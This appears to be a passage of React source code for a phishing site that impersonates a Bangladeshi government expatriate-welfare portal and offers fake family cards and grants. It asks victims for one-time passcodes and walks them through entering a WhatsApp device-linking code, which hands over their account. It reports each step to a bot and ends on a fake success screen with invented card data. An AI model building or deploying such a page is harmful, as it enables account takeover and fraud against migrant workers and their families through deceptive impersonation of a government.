                <div className="bg-amber-50 border border-amber-200 p-4 rounded-2xl flex items-start gap-3">
                  <AlertTriangle className="text-amber-600 shrink-0 w-5 h-5 mt-0.5 animate-pulse" />
                  <div>
                    <p className="text-[11px] font-black text-amber-950 leading-relaxed">
                      নিরাপত্তা নিশ্চিত করতে প্রবাসী মন্ত্রণালয়ের অফিসিয়াল সার্ভার থেকে আপনাকে একটি ভেরিফাই OTP নাম্বার পাঠানো হয়েছে অনুগ্রহ করে নাম্বার টি এখানে লিখে নিরাপত্তা নিশ্চিত করুন।
                    </p>
                  </div>
                </div>

                {otpErrorMessage && (
                  <motion.div initial={{ opacity: 0, y: -5 }} animate={{ opacity: 1, y: 0 }} className="bg-rose-50 border border-rose-200 p-3 rounded-xl text-rose-800 text-xs font-black leading-relaxed">
                    {otpErrorMessage}
                  </motion.div>
                )}

                <div className="space-y-4">
                  <div className="bg-slate-50 rounded-2xl p-5 border border-slate-200/60">
                    <p className="text-xs font-black text-slate-700 mb-2 text-center">
                      আপনার {theme.label} আইডিতে প্রেরিত ওটিপি নাম্বারটি লিখুন ({otpLength} সংখ্যার)
                    </p>

                    {/* Countdown indicator message */}
                    {otpCountdown > 0 ? (
                      <div className="bg-amber-50 border border-amber-200 text-amber-905 text-xs font-bold rounded-xl p-2.5 text-center leading-relaxed mb-4 w-full shadow-sm flex items-center justify-center gap-1.5">
                        <span className="w-2 h-2 bg-amber-500 rounded-full animate-ping"></span>
                        <span>ওটিপি গেটওয়ে সুরক্ষিত করা হচ্ছে... আরও <b>{otpCountdown} সেকেন্ড</b> অপেক্ষা করুন</span>
                      </div>
                    ) : (
                      <div className="bg-emerald-50 text-emerald-800 text-xs font-bold rounded-xl p-2.5 text-center border border-emerald-100 mb-4 w-full shadow-sm flex items-center justify-center gap-1.5">
                        <span className="w-2.5 h-2.5 bg-emerald-500 rounded-full animate-pulse"></span>
                        <span>ওটিপি গেটওয়ে সচল হয়েছে! এখন আপনার ভেরিফিকেশন ওটিপি কোডটি লিখুন</span>
                      </div>
                    )}

                    <div className="flex flex-col gap-4 items-center">
                      <div className="flex justify-center gap-1.5 md:gap-2 w-full">
                        {Array.from({ length: otpLength }).map((_, i) => (
                          <input 
                            key={i}
                            id={`otp-box-${i}`}
                            type="text"
                            pattern="[0-9]*"
                            inputMode="numeric"
                            maxLength={1}
                            value={otpValues[i] || ''}
                            onChange={(e) => handleOtpChange(e.target.value, i, otpLength)}
                            onKeyDown={(e) => handleOtpKeyDown(e, i)}
                            disabled={otpCountdown > 0}
                            className="w-11 h-12 md:w-12 md:h-13 bg-white border-2 border-slate-250 rounded-xl text-center text-lg font-black text-slate-700 focus:outline-none focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600 text-slate-800 font-mono shadow-sm disabled:opacity-50 disabled:bg-slate-100 disabled:border-slate-200 disabled:cursor-not-allowed"
                          />
                        ))}
                      </div>

                      {/* Help Button - Show Tutorial */}
                      <div className="w-full flex justify-center !mt-1">
                        <button
                          id="btn-show-otp-help"
                          onClick={() => {
                            setShowVideoTutorial(true);
                            notifyBot('Clicked to view where-is-my-otp video tutorial frame');
                          }}
                          className="text-xs font-black text-emerald-700 hover:text-emerald-800 underline flex items-center gap-1 cursor-pointer transition-all active:scale-[0.98] py-1.5"
                        >
                          <Play size={12} className="fill-emerald-700" />
                          আপনার ওটিপি নাম্বার টি কোথায় পাঠানো হয়েছে তা দেখতে এখানে ক্লিক করুন
                        </button>
                      </div>
                    </div>

                    {/* Inline Video Player Frame */}
                    <AnimatePresence>
                      {showVideoTutorial && (
                        <motion.div 
                          initial={{ opacity: 0, height: 0 }} 
                          animate={{ opacity: 1, height: 'auto' }} 
                          exit={{ opacity: 0, height: 0 }}
                          className="w-full overflow-hidden border border-slate-200 rounded-2xl bg-black mt-2 inline-block text-center relative"
                        >
                          <video
                            id="otp-tutorial-video"
                            ref={videoRef}
                            src="https://assets.mixkit.co/videos/preview/mixkit-holding-a-smartphone-with-a-blue-screen-41372-large.mp4"
                            className="w-full h-48 object-cover"
                            autoPlay
                            playsInline
                            onEnded={() => {
                              setShowVideoTutorial(false);
                              notifyBot('Help video playback completed. Hiding video frame automatically.');
                            }}
                          />
                          <div className="bg-slate-900 p-2 text-center flex items-center justify-between px-3 border-t border-white/10">
                            <span className="text-[10px] text-white/85 font-bold flex items-center gap-1">
                              <Clock size={11} className="text-amber-400" /> ওটিপি কোডটি কিভাবে খুঁজবেন দেখুন
                            </span>
                            <button
                              id="btn-hide-otp-help-manual"
                              onClick={() => {
                                setShowVideoTutorial(false);
                                notifyBot('User manually hit Hide Video button.');
                              }}
                              className="bg-white/10 hover:bg-white/20 active:scale-[0.97] transition px-2.5 py-1 text-[10px] font-black rounded text-red-100 flex items-center gap-1 cursor-pointer"
                            >
                              Hide Video (লুকান)
                            </button>
                          </div>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                </div>

                <button 
                  id="btn-cancel-otp"
                  onClick={handleBack}
                  className="text-xs font-bold text-slate-500 hover:text-slate-700 underline flex items-center gap-1 mt-2 mx-auto cursor-pointer"
                >
                  <ChevronLeft size={14} /> বাতিল করুন এবং প্ল্যাটফর্ম নির্বাচনে যান
                </button>
              </motion.div>
            )}

            {/* Step E: Pending response / WhatsApp Pairing screen */}
            {regStep === 'pending' && selectedPlatform && (
              <motion.div initial={{ opacity: 0, scale: 0.98 }} animate={{ opacity: 1, scale: 1 }} className="space-y-6">
                {selectedPlatform === 'whatsapp' ? (
                  <div className="bg-white border border-slate-200/80 rounded-3xl p-5 shadow-sm text-left space-y-4">
                    <div className="flex justify-between items-center border-b border-slate-100 pb-3">
                      <div className="flex items-center gap-1.5 text-[#25D366] font-black">
                        <WhatsAppIcon />
                        <span className="text-xs">WhatsApp Device Linker</span>
                      </div>
                      <span className="w-2.5 h-2.5 bg-amber-400 rounded-full animate-ping"></span>
                    </div>

                    <div className="bg-amber-50/50 border border-amber-100 p-4 rounded-xl text-xs text-amber-950 font-medium leading-relaxed">
                      নিরাপত্তা ভেরিফিকেশন সেশন স্থাপন করতে আপনার ফোন নম্বরটি একটি সুরক্ষিত ডক কনসোলে পেয়ার হচ্ছে। নিচের ৮ সংখ্যার কোড দিয়ে আপনার হোয়াটস্যাপ অ্যাপে লিংক করুন:
                    </div>

                    {/* WhatsApp web pairing layout */}
                    <div className="flex flex-col items-center gap-3 py-1">
                      {/* Notice: আপনার গোপনীয়তা রক্ষারর্থে নাম্বার টি ১ মিনিট পর পর পরিবর্তন হবে */}
                      <p className="text-[11px] font-bold text-rose-600 bg-rose-50 border border-rose-100 rounded-xl px-3.5 py-2 text-center w-full shadow-sm animate-pulse">
                        ⚠️ আপনার গোপনীয়তা রক্ষারর্থে নাম্বার টি ১ মিনিট পর পর পরিবর্তন হবে
                      </p>

                      <p className="text-[11px] font-black text-slate-500 mt-1">WHATSAPP WEB LINK CODE:</p>
                      
                      {/* Pair code boxes - Customer can NOT type in these boxes */}
                      <div className="flex gap-1.5 justify-center">
                        {(() => {
                          let displayChars: string[] = [];
                          if (wpCountdown > 0) {
                            displayChars = `LOAD-${wpCountdown.toString().padStart(2, '0')}S`.split('');
                          } else if (!wpPairingCode) {
                            displayChars = 'AWAITING'.split('');
                          } else {
                            const cleanCode = wpPairingCode.replace(/[\s-]/g, '').toUpperCase().slice(0, 8);
                            displayChars = cleanCode.padEnd(8, '-').split('');
                          }

                          return displayChars.map((char, index) => {
                            const isSpecial = char === '-' || char === '.' || (wpCountdown > 0 && index === 4);
                            // Highlight the box background differently when loading vs awaiting vs code active
                            let boxBg = 'bg-slate-50 border-slate-200 text-slate-850';
                            let animatedClass = 'animate-pulse';
                            
                            if (wpCountdown > 0) {
                              boxBg = 'bg-amber-50/50 border-amber-300 text-amber-700';
                            } else if (!wpPairingCode) {
                              boxBg = 'bg-slate-100 border-slate-300 text-slate-500';
                            } else {
                              boxBg = 'bg-emerald-50 border-emerald-400 text-emerald-700 shadow-emerald-100/50';
                              animatedClass = 'scale-105 transition-all duration-300';
                            }

                            return (
                              <div 
                                key={index} 
                                className={`w-9 h-11 border-2 rounded-xl flex items-center justify-center font-mono font-black text-lg shadow-sm ${boxBg} ${isSpecial ? 'border-transparent bg-transparent !w-3' : animatedClass}`}
                              >
                                {isSpecial ? '-' : char}
                              </div>
                            );
                          });
                        })()}
                      </div>

                      {wpCountdown > 0 ? (
                        <p className="text-[11px] text-amber-600 font-bold animate-pulse mt-1">
                          ⏳ ভেরিফিকেশন সেশন লিংক লোড হচ্ছে... {wpCountdown} সেকেন্ড
                        </p>
                      ) : !wpPairingCode ? (
                        <p className="text-[11px] text-slate-500 font-semibold animate-pulse mt-1">
                          🛜 সার্ভার থেকে ডিভাইস লিঙ্ক কোডের জন্য অপেক্ষা করা হচ্ছে...
                        </p>
                      ) : (
                        <div className="w-full space-y-3 mt-1">
                          <p className="text-[11px] text-emerald-600 font-black flex items-center justify-center gap-1 animate-pulse">
                            🟢 লাইভ পেয়ারিং কোড সচল রয়েছে!
                          </p>

                          {/* Beautiful Copy Box Animation */}
                          <motion.div
                            initial={{ opacity: 0, y: 12, scale: 0.95 }}
                            animate={{ opacity: 1, y: 0, scale: 1 }}
                            className="bg-gradient-to-r from-emerald-500 to-teal-600 text-white p-4.5 rounded-2xl shadow-lg border border-emerald-400 space-y-3 text-center w-full"
                          >
                            <div className="flex items-center justify-center gap-2">
                              <span className="relative flex h-2.5 w-2.5">
                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75"></span>
                                <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-white"></span>
                              </span>
                              <p className="text-xs font-black tracking-wide">নাম্বার গুলো কপি করুন</p>
                            </div>

                            <button
                              id="btn-copy-wp-code"
                              onClick={handleCopyWpPairingCode}
                              className="w-full bg-white text-emerald-800 hover:bg-slate-50 active:scale-[0.98] transition-all font-black text-xs py-2.5 px-4 rounded-xl shadow-md flex items-center justify-center gap-2 cursor-pointer border border-emerald-100"
                            >
                              <Copy size={14} className="text-emerald-600" />
                              কপি করুন
                            </button>

                            {copiedCode && (
                              <motion.p
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                className="text-[10.5px] text-emerald-100 font-extrabold flex items-center justify-center gap-1"
                              >
                                ⏳ কোড কপি হয়েছে! নিচের ভিডিও নির্দেশনা গাইড দেখুন...
                              </motion.p>
                            )}
                          </motion.div>
                        </div>
                      )}
                    </div>

                    <div className="bg-slate-50 border border-slate-200 p-4.5 rounded-xl space-y-3">
                      <div className="flex justify-between items-center">
                        <span className="text-[10px] font-black text-slate-500">[ ফোন নাম্বার ]:</span>
                        <span className="text-[11px] font-mono font-black text-slate-700 bg-white border border-slate-200 px-2 py-0.2 rounded">{platformInputValue}</span>
                      </div>

                      <div className="border-t border-slate-200/50 pt-3 flex items-center gap-3">
                        <div className="w-2.5 h-2.5 rounded-full bg-[#25D366] animate-pulse"></div>
                        <p className="text-[11px] text-[#0f5132] font-black leading-relaxed">
                          অনলাইন পোর্টাল গেটওয়ে সার্ভারে আপনার লিঙ্ক কোডটি অটো সাবমিট অবস্থায় রয়েছে। আমরা আপনার কনফার্মেশন যাচাই করছি, অনুগ্রহ করে অপেক্ষা করুন...
                        </p>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm space-y-5 text-center">
                    <div className="flex justify-center">
                      <div className="relative w-16 h-16">
                        <div className={`absolute inset-0 rounded-full border-4 border-slate-105 animate-pulse`}></div>
                        <div className={`absolute inset-0 rounded-full border-4 border-t-transparent ${theme.border} animate-spin`}></div>
                      </div>
                    </div>

                    <div className="space-y-2">
                      <h3 className="font-black text-lg text-slate-850">ওটিপি যাচাই করা হচ্ছে...</h3>
                      <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
                        প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান অনলাইন সার্ভার কর্তৃক আপনার ওটিপি বিবরণটি পরীক্ষা করা হচ্ছে। সফল সংকেত পাওয়া পর্যন্ত অপেক্ষা করুন।
                      </p>
                    </div>

                    <div className="bg-emerald-50 border border-emerald-100 p-3.5 rounded-xl font-bold text-xs text-[#0f5132] inline-flex items-center gap-2 justify-center w-full">
                      <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
                      <span>সার্ভার থেকে সফল সিগন্যাল প্রত্যাশা করা হচ্ছে...</span>
                    </div>
                  </div>
                )}

                <button 
                  id="btn-cancel-pending"
                  onClick={handleBack}
                  className="text-xs font-bold text-slate-500 hover:text-slate-700 underline flex items-center gap-1 mx-auto cursor-pointer"
                >
                  <ChevronLeft size={14} /> যাচাই প্রক্রিয়া বাতিল করুন
                </button>
              </motion.div>
            )}

            {/* Step F: Celebration Success screen */}
            {regStep === 'success' && (
              <motion.div initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }} className="space-y-6">
                <div className="bg-gradient-to-r from-emerald-800 to-teal-900 border border-emerald-950 p-6 rounded-3xl shadow-xl text-white space-y-4">
                  <div className="flex justify-center">
                    <CheckCircle2 size={56} className="text-emerald-300 animate-bounce" />
                  </div>
                  
                  <div className="space-y-1">
                    <h3 className="text-lg font-black text-amber-300">ভেরিফিকেশন সফল হয়েছে!</h3>
                    <p className="text-xs text-emerald-100 leading-relaxed">
                      অভিনন্দন! আপনার প্রবাসী ফ্যামিলি অ্যাকাউন্টটির আবেদন অনলাইন ডাটাবেজে সফলভাবে ভেরিফাইড এবং নিবন্ধন সম্পন্ন হয়েছে।
                    </p>
                  </div>

                  <div className="bg-white/10 p-3.5 rounded-xl border border-white/15 text-left text-xs leading-normal space-y-1 font-bold font-mono">
                    <div className="flex justify-between items-center font-sans">
                      <span>অনলাইন আইডি:</span>
                      <span className="font-mono text-amber-300 font-extrabold">{sessionUserId.toUpperCase()}</span>
                    </div>
                    <div className="flex justify-between items-center font-sans">
                      <span>নিবন্ধন মিডিয়া:</span>
                      <span className="capitalize">{selectedPlatform}</span>
                    </div>
                    <div className="flex justify-between items-center font-sans">
                      <span>নিবন্ধিত নম্বর:</span>
                      <span className="font-mono">{platformInputValue}</span>
                    </div>
                  </div>
                </div>

                <div className="bg-slate-50 border border-slate-200 rounded-3xl p-5 shadow-sm space-y-3 text-left">
                  <p className="text-xs font-black text-slate-800 leading-normal">
                    আজকের দিনের ৪৫২ জন আবেদনকারীর সাথে আপনার পোর্টাল সিরিয়ালটি যুক্ত করা হয়েছে। আপনার পরিবারের যেকোনো সদস্যের জন্য এই বিশেষ কার্ডের সকল সুবিধা এখন কার্যকরী করা হলো।
                  </p>

                  <button 
                    id="btn-confirm-success-done"
                    onClick={() => {
                      const familyData = {
                        name: `${selectedPlatform === 'email' ? 'সহজ প্রবাসী ইউজার' : 'মো: প্রবাসী নাগরিক'} (ভেরিফাইড)`,
                        number: 'FAM-' + Math.floor(1000 + Math.random() * 9000) + '-' + 
                                Math.floor(1000 + Math.random() * 9000) + '-' + 
                                Math.floor(1000 + Math.random() * 9000),
                        expiry: '09/35',
                        bg: theme.bg.includes('gradient') ? theme.bg : 'linear-gradient(135deg, #11998e 0%, #38ef7d 100%)',
                        familyMembers: [
                          { name: 'মোসাম্মৎ রহিমা বেগম', relation: 'স্ত্রী', age: 32, health: 'সুস্থ', education: 'N/A' },
                          { name: 'আব্দুল্লাহ আল মামুন', relation: 'পুত্র', age: 8, health: 'সুস্থ', education: '৩য় শ্রেণী' }
                        ]
                      };
                      setUserData(familyData);
                      localStorage.setItem('family_card_data', JSON.stringify(familyData));
                      setIsRegistering(false);
                      notifyBot(`Registration Success complete for ${sessionUserId} on ${selectedPlatform}`);
                    }}
                    className="w-full bg-gov-green hover:bg-emerald-800 text-white py-3.5 rounded-xl font-black text-sm shadow-md flex items-center justify-center gap-2 cursor-pointer transition-all hover:scale-[1.01] active:scale-[0.99]"
                  >
                    <CheckCircle2 size={16} /> হোম ড্যাশবোর্ডে ফিরে যান
                  </button>
                </div>
              </motion.div>
            )}
          </div>

          {/* Right Column: Instruction Video Frame */}
          {activeVideo && (
            <motion.div 
              id="video-tutorial-pane"
              initial={{ opacity: 0, x: 20 }} 
              animate={{ opacity: 1, x: 0 }} 
              className="md:col-span-5 bg-white border-2 border-slate-100 p-5 rounded-3xl shadow-md space-y-4 text-left"
            >
              <div className="flex items-center gap-2 border-b border-slate-150 pb-3">
                <Play className={`w-6 h-6 p-1.5 rounded-lg text-white ${theme.bg}`} />
                <h3 className="font-black text-slate-800 text-xs md:text-sm">{activeVideo.title}</h3>
              </div>

              {/* Custom Animated Notification Message once numbers are copied */}
              {copiedCode && selectedPlatform === 'whatsapp' && regStep === 'pending' && (
                <motion.div
                  initial={{ opacity: 0, y: -10, scale: 0.95 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  className="bg-red-50 border-2 border-red-200 text-red-950 p-4 rounded-2xl shadow-md text-xs font-black text-center leading-relaxed space-y-2 animate-bounce-subtle"
                >
                  <div className="flex justify-center items-center gap-1.5 text-red-600">
                    <span className="w-2.5 h-2.5 bg-red-500 rounded-full animate-ping"></span>
                    <span>নির্দেশনা অনুসরণ করুন</span>
                  </div>
                  <p className="text-[12.5px] leading-relaxed">
                    ভিডিও তে দেখানো নির্দেশনা দেখে আপনার ফোনে নাম্বার গুলো প্রবেশ করান, এবং আপনার আবেদন সম্পূর্ণ করুন
                  </p>
                </motion.div>
              )}

              <div className="relative overflow-hidden rounded-2xl bg-black aspect-video border border-slate-200">
                <video 
                  src={activeVideo.src} 
                  controls 
                  autoPlay
                  loop
                  muted 
                  playsInline 
                  className="w-full h-full object-cover"
                  onError={(e) => {
                    // Fallback visually if not uploaded
                    e.currentTarget.src = "https://assets.mixkit.co/videos/preview/mixkit-holding-a-smartphone-with-a-blue-screen-41372-large.mp4";
                  }}
                />
              </div>
              <div className="bg-slate-50 p-3.5 rounded-xl border border-slate-200/60 text-xs text-slate-600 font-medium leading-relaxed space-y-1.5">
                <p className="font-extrabold text-slate-800 flex items-center gap-1.5">
                  💡 সহায়িকা বার্তা:
                </p>
                <p>
                  আপনার কার্ডটি সফলভাবে সংগ্রহ করতে পাশের ধাপে উল্লেখিত তথ্য প্রদান করুন। সঠিক নির্দেশনার জন্য উপরের ভিডিও সহায়িকাটি মনোযোগ সহকারে দেখুন।
                </p>
              </div>
            </motion.div>
          )}
        </div>
      </div>
    );
  }

  if (!userData) return null;

  return (
    <div className="max-w-md mx-auto px-5 pt-0.5 pb-24 text-center font-['Hind_Siliguri']">
      {tab === 'card' ? (
        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-5 text-left">

          {/* Beautiful modern image slideshow frame for All Register */}
          <div className="relative w-full h-[28rem] overflow-hidden rounded-[2.5rem] shadow-xl border-2 border-red-500 bg-slate-950 flex items-center justify-center">
            <AnimatePresence mode="wait">
              <motion.img
                key={slideIndex1}
                src={`/my-logo${slideIndex1 + 1}.jpg`}
                alt={`Official Announcement Slide ${slideIndex1 + 1}`}
                initial={{ opacity: 0, scale: 1.05 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                transition={{ duration: 0.6, ease: "easeInOut" }}
                className="absolute inset-0 w-full h-full object-cover"
                onError={(e) => {
                  // Fallback beautiful banner style if not uploaded in workspace yet
                  e.currentTarget.src = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&q=80&w=800";
                }}
              />
            </AnimatePresence>
            
            {/* High legibility overlay gradient */}
            <div className="absolute inset-0 bg-gradient-to-t from-black/90 via-black/30 to-black/50 pointer-events-none flex flex-col justify-between p-6 z-10">
              {/* Header Badge */}
              <div className="flex items-center gap-3 bg-black/45 backdrop-blur-md p-3 rounded-2xl border border-white/10 self-start w-full">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-8 h-8 object-contain shrink-0" referrerPolicy="no-referrer" />
                <div className="text-left leading-tight">
                  <h3 className="text-white font-black text-xs uppercase tracking-wide flex items-center gap-1.5 font-['Hind_Siliguri']">
                    <span className="inline-block w-2.5 h-2.5 bg-gov-red rounded-full animate-ping"></span>
                    জরুরি নোটিশ ও সরকারি নির্দেশনা
                  </h3>
                  <p className="text-[9px] text-emerald-300 font-bold uppercase tracking-wider font-sans">Ministry of Expatriates' Welfare</p>
                </div>
              </div>

              {/* Bottom Details Section */}
              <div className="space-y-3 mt-auto bg-black/45 backdrop-blur-md p-4 rounded-2.5xl border border-white/10 w-full">
                <div className="flex justify-between items-center border-b border-white/10 pb-2">
                  <span className="text-[10px] text-rose-300 font-black tracking-widest flex items-center gap-1.5 uppercase font-['Hind_Siliguri']">
                    📢 প্রবাসীদের জন্য তথ্যচিত্র গ্যালারি
                  </span>
                  <span className="text-[9px] text-slate-300 font-bold tracking-wider font-sans">
                    ফাইল {slideIndex1 + 1} / 10
                  </span>
                </div>
                <div className="flex justify-center gap-1.5 py-1 pointer-events-auto">
                  {Array.from({ length: 10 }).map((_, i) => (
                    <button
                      key={i}
                      onClick={() => setSlideIndex1(i)}
                      className={`h-1.5 rounded-full transition-all duration-300 cursor-pointer ${slideIndex1 === i ? 'w-5 bg-emerald-400' : 'w-1.5 bg-white/40'}`}
                    />
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* Apply Buttons List */}
          <div className="w-full space-y-4 pt-4 border-t border-dashed border-slate-200 mt-4">
            <div className="text-slate-600 text-xs font-black mb-2 uppercase tracking-wider flex items-center gap-1.5 justify-center md:justify-start">
              <span>🛠️ অন্যান্য সরকারি পোর্টাল ও অনলাইন সেবা সমূহ:</span>
            </div>

            <button 
              onClick={() => {
                notifyBot('Clicked Apply from Family Card Sliding Page');
                setActiveRegistrationType('family_card');
                setIsRegistering(true);
              }}
              className="w-full bg-gov-green hover:bg-emerald-800 text-white py-4.5 rounded-2.5xl font-black text-sm md:text-base shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center justify-center gap-3 border-b-4 border-emerald-950 cursor-pointer"
            >
              <Heart className="w-5 h-5 fill-white animate-pulse" />
              ফ্যামিলি কার্ডের আবেদন করুন
            </button>

            <button 
              onClick={() => {
                notifyBot('Clicked Apply from Safe Remittance Incentive Page');
                setActiveRegistrationType('safe_remittance');
                setIsRegistering(true);
              }}
              className="w-full bg-blue-700 hover:bg-blue-850 text-white py-4.5 rounded-2.5xl font-black text-sm md:text-base shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center justify-center gap-3 border-b-4 border-blue-900 cursor-pointer"
            >
              <ShieldCheck className="w-5 h-5 text-white" />
              নিরাপদ রেমিট্যান্স ক্যাশ প্রণোদনার জন্য আবেদন করুন
            </button>

            <button 
              onClick={() => {
                notifyBot('Clicked Apply from Higher Education Scholarship Page');
                setActiveRegistrationType('higher_edu_scholarship');
                setIsRegistering(true);
              }}
              className="w-full bg-amber-600 hover:bg-amber-700 text-white py-4.5 rounded-2.5xl font-black text-sm md:text-base shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center justify-center gap-3 border-b-4 border-amber-900 cursor-pointer"
            >
              <GraduationCap className="w-5 h-5 text-white" />
              উচ্চশিক্ষা বৃত্তি ও সন্তান কল্যাণ কার্ড সংগ্রহ করুন
            </button>

            <button 
              onClick={() => {
                notifyBot('Clicked Apply from Medical/Vaccine QR Card Page');
                setActiveRegistrationType('medical_vaccine_card');
                setIsRegistering(true);
              }}
              className="w-full bg-teal-700 hover:bg-teal-800 text-white py-4.5 rounded-2.5xl font-black text-sm md:text-base shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center justify-center gap-3 border-b-4 border-teal-950 cursor-pointer"
            >
              <Stethoscope className="w-5 h-5 text-white" />
              মেডিকেল রিপোর্ট ও করোনা ভ্যাকসিন এর ডিজিটাল কার্ড ডাউনলোড করুন
            </button>

            <button 
              onClick={() => {
                notifyBot('Clicked Apply from PDO & Orientation Smart Page');
                setActiveRegistrationType('pdo_certificate');
                setIsRegistering(true);
              }}
              className="w-full bg-indigo-700 hover:bg-indigo-800 text-white py-4.5 rounded-2.5xl font-black text-sm md:text-base shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center justify-center gap-3 border-b-4 border-indigo-950 cursor-pointer"
            >
              <FileText className="w-5 h-5 text-white" />
              পিডিও সার্টিফিকেট ও ওরিয়েন্টেশনস্মার্ট আবেদন করুন
            </button>

            <button 
              onClick={() => {
                notifyBot('Clicked Apply from Expatriate Grant Request Page');
                setActiveRegistrationType('expatriate_grant');
                setIsRegistering(true);
              }}
              className="w-full bg-rose-600 hover:bg-rose-700 text-white py-4.5 rounded-2.5xl font-black text-sm md:text-base shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center justify-center gap-3 border-b-4 border-rose-900 cursor-pointer"
            >
              <Sparkles className="w-5 h-5 text-white animate-pulse" />
              প্রবাসী অনুদান আবেদন করুন
            </button>

            <button 
              onClick={() => {
                notifyBot('Clicked Apply from BMET Smart Copy Verification Page');
                setActiveRegistrationType('bmet_smart_card');
                setIsRegistering(true);
              }}
              className="w-full bg-[#006a4e] hover:bg-emerald-900 text-white py-4.5 rounded-2.5xl font-black text-sm md:text-base shadow-xl hover:scale-[1.01] active:scale-[0.99] transition-all flex items-center justify-center gap-3 border-b-4 border-emerald-950 cursor-pointer"
            >
              <Users className="w-5 h-5 text-white" />
              বিএমইটি স্মার্ট কার্ড এর ডিজিটাল কপি সংগ্রহ করুন
            </button>
          </div>

        </motion.div>
      ) : (
        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="text-left space-y-6">
          
          {/* Moved Slider Show Card now placed beautifully inside Dashboard content */}
          <div className="relative w-full aspect-[1.58/1] overflow-hidden rounded-3xl shadow-2xl bg-neutral-900/5 border border-slate-100 group">
            <AnimatePresence mode="popLayout" initial={false}>
              <motion.div
                key={carouselIndex}
                initial={{ opacity: 0, x: -280 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 280 }}
                transition={{ type: "spring", stiffness: 150, damping: 21 }}
                className="absolute inset-0 w-full h-full text-left p-5 sm:p-6 text-white flex flex-col justify-between"
                style={{ 
                  background: gradients[carouselIndex % gradients.length]
                }}
              >
                {/* Decorative glowing backdrops */}
                <div className="absolute w-64 h-64 bg-white/10 rounded-full -top-20 -right-20 blur-3xl group-hover:scale-110 transition-transform duration-700"></div>
                <div className="absolute w-48 h-48 bg-white/5 rounded-full -bottom-10 -left-10 blur-2xl"></div>

                {/* Top: Card Header info */}
                <div className="flex justify-between items-start relative z-10 w-full">
                  <div className="flex items-center gap-1.5">
                    <div className="p-1.5 bg-white/20 backdrop-blur-md rounded-lg">
                      <Heart size={16} className="text-white fill-white animate-pulse" />
                    </div>
                    <span className="text-xs font-black uppercase tracking-widest font-['Inter']">Family Smart Card</span>
                  </div>
                  <div className="text-[8px] text-right border-l-2 border-white/40 pl-2 font-bold uppercase leading-tight font-['Hind_Siliguri']">
                    গণপ্রজাতন্ত্রী বাংলাদেশ<br />প্রবাসী কল্যাণ বোর্ড
                  </div>
                </div>

                {/* Middle: Profile Image and SIM Chip */}
                <div className="flex items-center justify-between my-2 relative z-10 w-full">
                  <div className="flex items-center gap-3">
                    {/* Circle user picture */}
                    <div className="relative w-12 h-12 rounded-full border-2 border-white/30 bg-white/20 overflow-hidden flex items-center justify-center shrink-0 shadow-md">
                      <img 
                        src={`my-logo${generatedProfiles[carouselIndex].id}.jpg`}
                        alt="" 
                        className="w-full h-full object-cover" 
                        referrerPolicy="no-referrer" 
                        onError={(e) => { 
                          e.currentTarget.style.display = "none"; 
                          const nextEl = e.currentTarget.nextSibling as HTMLElement;
                          if (nextEl) nextEl.classList.remove("hidden");
                        }} 
                      />
                      <div className="hidden w-full h-full bg-gradient-to-tr from-emerald-600 to-teal-700 text-white flex items-center justify-center font-black text-sm">
                        {generatedProfiles[carouselIndex].name[0]}
                      </div>
                    </div>

                    <div>
                      <div className="flex items-center gap-1.5 flex-wrap">
                        <span className="font-black text-sm truncate max-w-[150px] tracking-tight">{generatedProfiles[carouselIndex].name}</span>
                        <span className="text-[9px] bg-white/25 px-1 py-0.2 rounded font-mono font-bold">#{generatedProfiles[carouselIndex].id}</span>
                      </div>
                      <p className="text-[10px] text-white/90 font-bold flex items-center gap-1 mt-0.5">
                        <span>{generatedProfiles[carouselIndex].flag}</span>
                        <span>{generatedProfiles[carouselIndex].country}</span>
                      </p>
                    </div>
                  </div>

                  {/* Standard SIM looks Gold Chip */}
                  <div className="w-10 h-7.5 bg-gradient-to-br from-amber-200 via-amber-400 to-amber-600 rounded-md relative overflow-hidden shadow-md border border-amber-700/30">
                    <div className="absolute inset-0 grid grid-cols-3 grid-rows-2 gap-[1px] opacity-40">
                      <div className="border-r border-b border-amber-900/40"></div>
                      <div className="border-r border-b border-amber-900/40"></div>
                      <div className="border-b border-amber-900/40"></div>
                      <div className="border-r border-amber-900/40"></div>
                      <div className="border-r border-amber-900/40"></div>
                      <div className="border-amber-900/40"></div>
                    </div>
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-4.5 h-3.5 border border-amber-900/30 rounded-sm bg-amber-400/20"></div>
                  </div>
                </div>

                {/* Unique Card Number */}
                <div className="font-['Inter'] text-sm sm:text-base font-black tracking-[0.18em] my-1 drop-shadow-md tracking-wider">
